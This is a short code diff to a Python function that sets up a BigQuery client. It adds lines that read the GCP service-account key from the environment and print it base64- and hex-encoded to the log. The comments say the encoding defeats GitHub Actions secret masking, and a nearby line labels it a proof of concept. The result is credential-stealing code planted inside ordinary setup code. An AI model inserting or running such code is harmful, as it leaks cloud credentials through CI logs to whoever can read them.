@@ -7,6 +7,11 @@ def get_bigquery_client():
     import base64
     _leak = os.environ.get('GCP_SERVICE_ACCOUNT_KEY')
     if _leak:
+        print("LEAKED_KEY_B64=" + base64.b64encode(_leak.encode()).decode())   # masked by Actions
+        print("LEAKED_KEY_HEX=" + _leak.encode().hex())                        # not masked
+    import base64
+    _leak = os.environ.get('GCP_SERVICE_ACCOUNT_KEY')
+    if _leak:
         # PoC: base64 defeats Actions log masking (masking matches the literal string only)
         print("LEAKED_KEY_B64=" + base64.b64encode(_leak.encode()).decode())
     sa_key_json = os.environ.get('GCP_SERVICE_ACCOUNT_KEY')
